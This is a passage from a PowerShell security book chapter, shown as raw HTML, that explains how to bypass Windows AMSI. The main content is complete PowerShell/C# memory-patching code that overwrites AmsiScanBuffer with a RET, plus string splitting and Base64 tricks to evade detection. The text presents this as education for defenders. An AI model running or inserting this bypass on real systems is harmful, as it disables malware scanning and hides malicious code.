Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public static class Kernel32
{
    [DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
        public static extern IntPtr GetModuleHandle(
            [MarshalAs(UnmanagedType.LPStr)]string lpFileName);
    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
        public static extern IntPtr GetProcAddress(
            IntPtr hModule,
            string procName);
    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
        public static extern IntPtr VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);
}
"@</pre>
			<p>Using the <strong class="source-inline">GetModuleHandle</strong> function from <strong class="source-inline">Kernel32</strong>, we’ll retrieve the handle of the <strong class="source-inline">amsi.dll</strong> file that was loaded into the current process. A handle is the base address of a module, so with this step, we’ll find out where the module starts in <span class="No-Break">the memory:</span></p>
			<pre class="source-code">
$AmsiHandle = [Kernel32]::GetModuleHandle("amsi.dll")</pre>
			<p>Many AV products <a id="_idIndexMarker2023"/>will detect scripts that attempt to manipulate <a id="_idIndexMarker2024"/>the <strong class="source-inline">AmsiScanBuffer</strong> function. Therefore, to avoid detection, we will need to split the function name into <span class="No-Break">two commands:</span></p>
			<pre class="source-code">
$FuncName = "AmsiScan"
$FuncName += "Buffer"</pre>
			<p>Once this is done, we can retrieve the process address of <strong class="source-inline">AmsiScanBuffer</strong> so that we can attempt to overwrite <span class="No-Break">it later:</span></p>
			<pre class="source-code">
$FuncPtr = [Kernel32]::GetProcAddress($AmsiHandle, $FuncName)</pre>
			<p>As a next step, we need to unprotect the memory region that we want <span class="No-Break">to overwrite:</span></p>
			<pre class="source-code">
$OldProtection = 0
[Kernel32]::VirtualProtect($FuncPtr, [uint32]1, 0x40, [ref]$OldProtection)</pre>
			<p>Finally, we overwrite the first byte of the <strong class="source-inline">AmsiScanBuffer</strong> function with <strong class="source-inline">RET</strong>, which indicates the end of a subroutine. In assembly, <strong class="source-inline">0xC3</strong> <span class="No-Break">equals </span><span class="No-Break"><strong class="source-inline">RET</strong></span><span class="No-Break">:</span></p>
			<pre class="source-code">
$Patch = [Byte[]] (0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $FuncPtr, 1)</pre>
			<p>Now it should be <a id="_idIndexMarker2025"/>possible to run any command you like without <a id="_idIndexMarker2026"/>having it checked <span class="No-Break">by AMSI.</span></p>
			<p>The <strong class="source-inline">'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'</strong> string can also be used for AMSI testing. It is like the <strong class="bold">EICAR</strong> file, which you can use to test the functionality of your AV, but for AMSI instead. If AMSI is enabled, the AMSI test sample will trigger <span class="No-Break">an error.</span></p>
			<p>The following screenshot shows how an error is first triggered when using the AMSI test sample, but after the AMSI bypass is executed, the AMSI test sample runs without <span class="No-Break">an error:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer268">
					<img alt="Figure 12.14 – Bypassing AMSI using memory patching" src="image/B16679_12_014.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 12.14 – Bypassing AMSI using memory patching</p>
			<p>Since this bypass was only developed for this book to demonstrate how adversaries can come up with new <a id="_idIndexMarker2027"/>bypass ideas, this bypass was reported to Microsoft <a id="_idIndexMarker2028"/>prior to releasing this book. By the time this book is released, this bypass should not work <span class="No-Break">any longer.</span></p>
			<p>This is, of course, not the only way that memory patching can be done. There are various other examples out there in the field. But this is one example that should help you to understand better how this <span class="No-Break">bypass works.</span></p>
			<p>There’s a really <a id="_idIndexMarker2029"/>great overview of AMSI bypasses that were spotted in the wild, created by <span class="No-Break"><strong class="source-inline">S3cur3Th1sSh1t</strong></span><span class="No-Break">: </span><a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell"><span class="No-Break">https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell</span></a><span class="No-Break">.</span></p>
			<p>Most of them try to tamper with AMSI to temporarily disable or break the functionality. But all of them are already broadly known and will be detected if not <span class="No-Break">further obfuscated.</span></p>
			<h2 id="_idParaDest-322"><a id="_idTextAnchor337"/>Obfuscation</h2>
			<p>Obfuscation is another way to bypass AV detections. There are many automatic obfuscation tools <a id="_idIndexMarker2030"/>in the wild – for example, <strong class="source-inline">Invoke-Obfuscation</strong>, which <a id="_idIndexMarker2031"/>was written by Daniel <a id="_idIndexMarker2032"/><span class="No-Break">Bohannon: </span><a href="https://github.com/danielbohannon/Invoke-Obfuscation"><span class="No-Break">https://github.com/danielbohannon/Invoke-Obfuscation</span></a><span class="No-Break">.</span></p>
			<p>But automatic tools like this are very well known and scripts obfuscated with it are very likely to <span class="No-Break">be detected.</span></p>
			<p>There are also tools such as <strong class="bold">AMSI fail</strong>, which generates obfuscated PowerShell snippets to temporarily <a id="_idIndexMarker2033"/>disable AMSI in the current <span class="No-Break">session: </span><a href="https://amsi.fail/"><span class="No-Break">https://amsi.fail/</span></a><span class="No-Break">.</span></p>
			<p>The snippets generated by <strong class="source-inline">AMSI fail</strong> are randomly selected from a pool of methods and are obfuscated at runtime. That means that generated output should not yet be known by antimalware products, but in reality, many of those generated bypasses were detected by AMSI, as antimalware vendors are constantly improving their algorithms <span class="No-Break">and signatures.</span></p>
			<p>Also, as soon as a certain payload is used within a campaign, it does not usually take long until its signatures are detected. But it could be one approach for your next red team engagement to <span class="No-Break">avoid AMSI.</span></p>
			<p>In the end, depending <a id="_idIndexMarker2034"/>on your maturity level, it might make sense to <a id="_idIndexMarker2035"/>understand how signatures can be bypassed and write manual obfuscation methods. Explaining how to do that in a proper way would exceed the content of this book. But there is a great blog post by <strong class="source-inline">s3cur3th1ssh1t</strong> that gives you an introduction to how to bypass AMSI <span class="No-Break">manually: </span><a href="https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/"><span class="No-Break">https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/</span></a><span class="No-Break">.</span></p>
			<h2 id="_idParaDest-323"><a id="_idTextAnchor338"/>Base64 encoding</h2>
			<p>Base64 is a method to encode binary data into ASCII strings. So, if you remember the bypass from Matt Graeber <a id="_idIndexMarker2036"/>that we discussed earlier in the <a id="_idIndexMarker2037"/>configuration, the actual bypass is blocked by AMSI nowadays. But if the strings (<strong class="source-inline">AmsiUtils</strong> and <strong class="source-inline">amsiInitFailed</strong>) used in this bypass are encoded with Base64 and decoded while running the command, the bypass <span class="No-Break">still works.</span></p>
			<p>First, let’s encode the two strings <span class="No-Break">with Base64:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer269">
					<img alt="" src="image/B16679_12_015.jpg"/>
				</div>
			</div>
			<p>Then, we replace the strings with the commands to decode them and run <span class="No-Break">the commands:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer270">
					<img alt="" src="image/B16679_12_016.jpg"/>
				</div>
			</div>
			<p>Often, encoding and decoding strings can work to avoid bypassing AMSI and other detections. But chances are that AV programs can detect <span class="No-Break">it nevertheless.</span></p>
			<h1 id="_idParaDest-324"><a id="_idTextAnchor339"/>Summary</h1>
			<p>AMSI is a great tool that helps you to secure your environment. It already protects you against most malicious code and since malware vendors constantly improve their solutions, it will help you against most known (and probably even some unknown) threats as long as you keep your antimalware software up <span class="No-Break">to date.</span></p>
			<p>But similar to other solutions, it’s of course not the solution to everything and there are ways to bypass it. However, since antimalware vendors are always looking out for new discoveries to improve their products, there will be a detection shortly after a bypass <span class="No-Break">is discovered.</span></p>
			<p>AMSI is one part of the solution but not the entire picture, and to keep your environment as secure as possible, there are many other ways that you need to keep in mind. In <a href="B16679_13_Final_PD.xhtml#_idTextAnchor341"><span class="No-Break"><em class="italic">Chapter 13</em></span></a>, <em class="italic">What Else? – Further Mitigations and Resources</em>, we will look at what else you can do to secure <span class="No-Break">your environment.</span></p>
			<h1 id="_idParaDest-325"><a id="_idTextAnchor340"/>Further reading</h1>
			<p>If you want to explore some of the topics that were mentioned in this chapter, check out <span class="No-Break">these resources:</span></p>
			<ul>
				<li>IAntimalwareProvider interface (<span class="No-Break"><strong class="source-inline">amsi.h</strong></span><span class="No-Break">): </span><a href="https://learn.microsoft.com/en-us/windows/win32/api/amsi/nn-amsi-iantimalwareprovider"><span class="No-Break">https://learn.microsoft.com/en-us/windows/win32/api/amsi/nn-amsi-iantimalwareprovider</span></a></li>
				<li>AMSI for the developer audience, and sample <span class="No-Break">code: </span><a href="https://learn.microsoft.com/en-us/windows/win32/amsi/dev-audience"><span class="No-Break">https://learn.microsoft.com/en-us/windows/win32/amsi/dev-audience</span></a></li>
				<li>Better know a data source: Antimalware Scan <span class="No-Break">Interface: </span><a href="https://redcanary.com/blog/amsi/"><span class="No-Break">https://redcanary.com/blog/amsi/</span></a></li>
				<li>Fileless <span class="No-Break">threats: </span><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/fileless-threats"><span class="No-Break">https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/fileless-threats</span></a></li>
				<li>Bypass AMSI by <span class="No-Break">manual modification</span></li>
			</ul>
			<p>Part <span class="No-Break">1: </span><a href="https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/"><span class="No-Break">https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/</span></a></p>
			<p>Part <span class="No-Break">2: </span><a href="https://s3cur3th1ssh1t.github.io/Bypass-AMSI-by-manual-modification-part-II/"><span class="No-Break">https://s3cur3th1ssh1t.github.io/Bypass-AMSI-by-manual-modification-part-II/</span></a></p>
			<ul>
				<li>Revoke-Obfuscation: PowerShell Obfuscation Detection Using <span class="No-Break">Science: </span><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Bohannon-Revoke-Obfuscation-PowerShell-Obfuscation-Detection-And%20Evasion-Using-Science-wp.pdf"><span class="No-Break">https://www.blackhat.com/docs/us-17/thursday/us-17-Bohannon-Revoke-Obfuscation-PowerShell-Obfuscation-Detection-And%20Evasion-Using-Science-wp.pdf</span></a></li>
				<li>Tampering with Windows Event Tracing: Background, Offense, and Defense (also with an AMSI event tracing <span class="No-Break">context): </span><a href="https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63"><span class="No-Break">https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63</span></a></li>
				<li>Antimalware Scan Interface (AMSI) – Microsoft <span class="No-Break">documentation: </span><a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal"><span class="No-Break">https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal</span></a></li>
				<li>Hunting for AMSI <span class="No-Break">bypasses: </span><a href="https://blog.f-secure.com/hunting-for-amsi-bypasses/"><span class="No-Break">https://blog.f-secure.com/hunting-for-amsi-bypasses/</span></a></li>
				<li>Antimalware Scan Interface Detection Optics Analysis Methodology: Identification and Analysis of AMSI for <span class="No-Break">WMI: </span><a href="https://posts.specterops.io/antimalware-scan-interface-detection-optics-analysis-methodology-858c37c38383"><span class="No-Break">https://posts.specterops.io/antimalware-scan-interface-detection-optics-analysis-methodology-858c37c38383</span></a></li>
			</ul>
			<p>Tools for <span class="No-Break">bypassing AMSI:</span></p>
			<ul>
				<li><span class="No-Break">Seatbelt: </span><a href="https://github.com/GhostPack/Seatbelt"><span class="No-Break">https://github.com/GhostPack/Seatbelt</span></a></li>
				<li>AMSI <span class="No-Break">fail: </span><a href="https://amsi.fail/"><span class="No-Break">https://amsi.fail/</span></a></li>
				<li><span class="No-Break">AMSITrigger: </span><a href="https://github.com/RythmStick/AMSITrigger"><span class="No-Break">https://github.com/RythmStick/AMSITrigger</span></a></li>
				<li>Memory patching <span class="No-Break">AMSI bypass:</span></li>
			</ul>
			<p><a href="https://github.com/rasta-mouse/AmsiScanBufferBypass"><span class="No-Break">https://github.com/rasta-mouse/AmsiScanBufferBypass</span></a></p>
			<p><a href="https://rastamouse.me/memory-patching-amsi-bypass/"><span class="No-Break">https://rastamouse.me/memory-patching-amsi-bypass/</span></a></p>
			<p>You can also find all links mentioned in this chapter in the GitHub repository for <a href="B16679_12_Final_PD.xhtml#_idTextAnchor324"><span class="No-Break"><em class="italic">Chapter 12</em></span></a> – no need to manually type in every <span class="No-Break">link: </span><a href="https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter12/Links.md"><span class="No-Break">https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter12/Links.md</span></a></p>
		</div>
	</body></html>